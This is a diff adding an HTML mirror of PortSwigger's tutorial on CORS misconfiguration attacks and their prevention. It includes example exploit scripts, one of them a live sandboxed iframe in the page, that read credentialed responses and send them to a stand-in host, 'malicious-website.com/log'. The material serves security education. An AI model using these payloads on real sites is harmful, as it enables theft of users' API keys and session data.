@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cross-origin resource sharing (CORS) &mdash; PortSwigger 0.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            PortSwigger
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">服务端</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../server/race_conditions.html">条件竞争</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">客户端</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../xss/cross-site-scripting.html">Cross-site scripting</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">PortSwigger</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Cross-origin resource sharing (CORS)</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/source/client/cors/cors.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="cross-origin-resource-sharing-cors">
+<h1>Cross-origin resource sharing (CORS)<a class="headerlink" href="#cross-origin-resource-sharing-cors" title="Permalink to this heading"></a></h1>
+<p>In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks. This topic was written in collaboration with PortSwigger Research, who popularized this attack class with the presentation <a class="reference external" href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">Exploiting CORS misconfigurations for Bitcoins and bounties</a>.</p>
+<section id="what-is-cors-cross-origin-resource-sharing">
+<h2>What is CORS (cross-origin resource sharing)?<a class="headerlink" href="#what-is-cors-cross-origin-resource-sharing" title="Permalink to this heading"></a></h2>
+<p>Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (<a class="reference external" href="https://portswigger.net/web-security/cors/same-origin-policy">SOP</a>). However, it also provides potential for cross-domain attacks, if a website’s CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as <a class="reference external" href="https://portswigger.net/web-security/csrf">cross-site request forgery</a> (<a class="reference external" href="https://portswigger.net/web-security/csrf">CSRF</a>).</p>
+<p><img alt="CORS" src="https://portswigger.net/web-security/images/attack-on-cors.svg" /></p>
+<section id="labs">
+<h3>Labs<a class="headerlink" href="#labs" title="Permalink to this heading"></a></h3>
+<p>If you’re already familiar with the basic concepts behind CORS vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors">View all CORS labs</a></p></li>
+</ul>
+</section>
+</section>
+<section id="same-origin-policy">
+<h2>Same-origin policy<a class="headerlink" href="#same-origin-policy" title="Permalink to this heading"></a></h2>
+<p>The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.</p>
+<section id="read-more">
+<h3>Read more<a class="headerlink" href="#read-more" title="Permalink to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/web-security/cors/same-origin-policy">Same-origin policy</a></p></li>
+</ul>
+</section>
+</section>
+<section id="relaxation-of-the-same-origin-policy">
+<h2>Relaxation of the same-origin policy<a class="headerlink" href="#relaxation-of-the-same-origin-policy" title="Permalink to this heading"></a></h2>
+<p>The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).</p>
+<p>The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.</p>
+<section id="id1">
+<h3>Read more<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/web-security/cors/access-control-allow-origin">CORS and the Access-Control-Allow-Origin response header</a></p></li>
+</ul>
+</section>
+</section>
+<section id="vulnerabilities-arising-from-cors-configuration-issues">
+<h2>Vulnerabilities arising from CORS configuration issues<a class="headerlink" href="#vulnerabilities-arising-from-cors-configuration-issues" title="Permalink to this heading"></a></h2>
+<p>Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.</p>
+<section id="server-generated-acao-header-from-client-specified-origin-header">
+<h3>Server-generated <a class="reference external" href="https://portswigger.net/web-security/cors/access-control-allow-origin">ACAO</a> header from client-specified Origin header<a class="headerlink" href="#server-generated-acao-header-from-client-specified-origin-header" title="Permalink to this heading"></a></h3>
+<p>Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.</p>
+<p>One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">sensitive</span><span class="o">-</span><span class="n">victim</span><span class="o">-</span><span class="n">data</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="n">Host</span><span class="p">:</span> <span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">malicious</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">sessionid</span><span class="o">=...</span>
+</pre></div>
+</div>
+<p>It then responds with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">malicious</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span> <span class="o">...</span>
+</pre></div>
+</div>
+<p>These headers state that access is allowed from the requesting domain (<code class="docutils literal notranslate"><span class="pre">malicious-website.com</span></code>) and that the cross-origin requests can include cookies (<code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Credentials:</span> <span class="pre">true</span></code>) and so will be processed in-session.</p>
+<p>Because the application reflects arbitrary origins in the <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin</span></code> header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">var</span> <span class="n">req</span> <span class="o">=</span> <span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span> <span class="n">req</span><span class="o">.</span><span class="n">onload</span> <span class="o">=</span> <span class="n">reqListener</span><span class="p">;</span> <span class="n">req</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;https://vulnerable-website.com/sensitive-victim-data&#39;</span><span class="p">,</span><span class="n">true</span><span class="p">);</span> <span class="n">req</span><span class="o">.</span><span class="n">withCredentials</span> <span class="o">=</span> <span class="n">true</span><span class="p">;</span> <span class="n">req</span><span class="o">.</span><span class="n">send</span><span class="p">();</span> <span class="n">function</span> <span class="n">reqListener</span><span class="p">()</span> <span class="p">{</span>   <span class="n">location</span><span class="o">=</span><span class="s1">&#39;//malicious-website.com/log?key=&#39;</span><span class="o">+</span><span class="n">this</span><span class="o">.</span><span class="n">responseText</span><span class="p">;</span> <span class="p">};</span>
+</pre></div>
+</div>
+<p><strong>LAB</strong></p>
+<p>APPRENTICE<a class="reference external" href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack">CORS vulnerability with basic origin reflection</a></p>
+</section>
+<section id="errors-parsing-origin-headers">
+<h3>Errors parsing Origin headers<a class="headerlink" href="#errors-parsing-origin-headers" title="Permalink to this heading"></a></h3>
+<p>Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin</span></code> header so that access is granted. For example, the application receives a normal request like:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">data</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="n">Host</span><span class="p">:</span> <span class="n">normal</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="o">...</span> <span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">innocent</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+<p>The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="o">...</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">innocent</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+<p>Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations’ domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.</p>
+<p>For example, suppose an application grants access to all domains ending in:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">normal</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+<p>An attacker might be able to gain access by registering the domain:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hackersnormal</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+<p>Alternatively, suppose an application grants access to all domains beginning with</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">normal</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+<p>An attacker might be able to gain access using the domain:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">normal</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span><span class="o">.</span><span class="n">evil</span><span class="o">-</span><span class="n">user</span><span class="o">.</span><span class="n">net</span>
+</pre></div>
+</div>
+</section>
+<section id="whitelisted-null-origin-value">
+<h3>Whitelisted null origin value<a class="headerlink" href="#whitelisted-null-origin-value" title="Permalink to this heading"></a></h3>
+<p>The specification for the Origin header supports the value <code class="docutils literal notranslate"><span class="pre">null</span></code>. Browsers might send the value <code class="docutils literal notranslate"><span class="pre">null</span></code> in the Origin header in various unusual situations:</p>
+<ul class="simple">
+<li><p>Cross-origin redirects.</p></li>
+<li><p>Requests from serialized data.</p></li>
+<li><p>Request using the <code class="docutils literal notranslate"><span class="pre">file:</span></code> protocol.</p></li>
+<li><p>Sandboxed cross-origin requests.</p></li>
+</ul>
+<p>Some applications might whitelist the <code class="docutils literal notranslate"><span class="pre">null</span></code> origin to support local development of the application. For example, suppose an application receives the following cross-origin request:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">sensitive</span><span class="o">-</span><span class="n">victim</span><span class="o">-</span><span class="n">data</span> <span class="n">Host</span><span class="p">:</span> <span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Origin</span><span class="p">:</span> <span class="n">null</span>
+</pre></div>
+</div>
+<p>And the server responds with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">null</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+</pre></div>
+</div>
+<p>In this situation, an attacker can use various tricks to generate a cross-origin request containing the value <code class="docutils literal notranslate"><span class="pre">null</span></code> in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed <code class="docutils literal notranslate"><span class="pre">iframe</span></code> cross-origin request of the form:</p>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send();  function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; </script>"></iframe>
+<p><strong>LAB</strong></p>
+<p>APPRENTICE<a class="reference external" href="https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack">CORS vulnerability with trusted null origin</a></p>
+</section>
+<section id="exploiting-xss-via-cors-trust-relationships">
+<h3><a class="reference external" href="https://portswigger.net/web-security/cross-site-scripting/exploiting">Exploiting XSS</a> via CORS trust relationships<a class="headerlink" href="#exploiting-xss-via-cors-trust-relationships" title="Permalink to this heading"></a></h3>
+<p>Even “correctly” configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (<a class="reference external" href="https://portswigger.net/web-security/cross-site-scripting">XSS</a>), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.</p>
+<p>Given the following request:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">requestApiKey</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="n">Host</span><span class="p">:</span> <span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">sessionid</span><span class="o">=...</span>
+</pre></div>
+</div>
+<p>If the server responds with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+</pre></div>
+</div>
+<p>Then an attacker who finds an XSS vulnerability on <code class="docutils literal notranslate"><span class="pre">subdomain.vulnerable-website.com</span></code> could use that to retrieve the API key, using a URL like:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
+</pre></div>
+</div>
+</section>
+<section id="breaking-tls-with-poorly-configured-cors">
+<h3>Breaking TLS with poorly configured CORS<a class="headerlink" href="#breaking-tls-with-poorly-configured-cors" title="Permalink to this heading"></a></h3>
+<p>Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">GET</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">requestApiKey</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="n">Host</span><span class="p">:</span> <span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">trusted</span><span class="o">-</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">sessionid</span><span class="o">=...</span>
+</pre></div>
+</div>
+<p>The application responds with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">trusted</span><span class="o">-</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+</pre></div>
+</div>
+<p>In this situation, an attacker who is in a position to intercept a victim user’s traffic can exploit the CORS configuration to compromise the victim’s interaction with the application. This attack involves the following steps:</p>
+<ul>
+<li><p>The victim user makes any plain HTTP request.</p></li>
+<li><p>The attacker injects a redirection to:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">trusted</span><span class="o">-</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+</li>
+<li><p>The victim’s browser follows the redirect.</p></li>
+<li><p>The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+</li>
+<li><p>The victim’s browser makes the CORS request, including the origin:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">trusted</span><span class="o">-</span><span class="n">subdomain</span><span class="o">.</span><span class="n">vulnerable</span><span class="o">-</span><span class="n">website</span><span class="o">.</span><span class="n">com</span>
+</pre></div>
+</div>
+</li>
+<li><p>The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.</p></li>
+<li><p>The attacker’s spoofed page can read the sensitive data and transmit it to any domain under the attacker’s control.</p></li>
+</ul>
+<p>This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/cors/lab-breaking-https-attack">CORS vulnerability with trusted insecure protocols</a></p>
+<section id="id2">
+<h4>Read more<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting</a></p></li>
+</ul>
+</section>
+</section>
+<section id="intranets-and-cors-without-credentials">
+<h3>Intranets and CORS without credentials<a class="headerlink" href="#intranets-and-cors-without-credentials" title="Permalink to this heading"></a></h3>
+<p>Most CORS attacks rely on the presence of the response header:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+</pre></div>
+</div>
+<p>Without that header, the victim user’s browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.</p>
+<p>However, there is one common situation where an attacker can’t access a website directly: when it’s part of an organization’s intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com
+</pre></div>
+</div>
+<p>And the server responds with:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span> <span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="o">*</span>
+</pre></div>
+</div>
+<p>The application server is trusting resource requests from any origin without credentials. If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim’s browser as a proxy for accessing intranet resources.</p>
+<p><strong>LAB</strong></p>
+<p>EXPERT<a class="reference external" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">CORS vulnerability with internal network pivot attack</a></p>
+</section>
+</section>
+<section id="how-to-prevent-cors-based-attacks">
+<h2>How to prevent CORS-based attacks<a class="headerlink" href="#how-to-prevent-cors-based-attacks" title="Permalink to this heading"></a></h2>
+<p>CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks.</p>
+<section id="proper-configuration-of-cross-origin-requests">
+<h3>Proper configuration of cross-origin requests<a class="headerlink" href="#proper-configuration-of-cross-origin-requests" title="Permalink to this heading"></a></h3>
+<p>If a web resource contains sensitive information, the origin should be properly specified in the <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin</span></code> header.</p>
+</section>
+<section id="only-allow-trusted-sites">
+<h3>Only allow trusted sites<a class="headerlink" href="#only-allow-trusted-sites" title="Permalink to this heading"></a></h3>
+<p>It may seem obvious but origins specified in the <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin</span></code> header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.</p>
+</section>
+<section id="avoid-whitelisting-null">
+<h3>Avoid whitelisting null<a class="headerlink" href="#avoid-whitelisting-null" title="Permalink to this heading"></a></h3>
+<p>Avoid using the header <code class="docutils literal notranslate"><span class="pre">Access-Control-Allow-Origin:</span> <span class="pre">null</span></code>. Cross-origin resource calls from internal documents and sandboxed requests can specify the <code class="docutils literal notranslate"><span class="pre">null</span></code> origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.</p>
+</section>
+<section id="avoid-wildcards-in-internal-networks">
+<h3>Avoid wildcards in internal networks<a class="headerlink" href="#avoid-wildcards-in-internal-networks" title="Permalink to this heading"></a></h3>
+<p>Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.</p>
+</section>
+<section id="cors-is-not-a-substitute-for-server-side-security-policies">
+<h3>CORS is not a substitute for server-side security policies<a class="headerlink" href="#cors-is-not-a-substitute-for-server-side-security-policies" title="Permalink to this heading"></a></h3>
+<p>CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.</p>
+<section id="id3">
+<h4>Read more<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/burp/vulnerability-scanner">Find CORS vulnerabilities using Burp Suite’s web vulnerability scanner</a></p></li>
+</ul>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
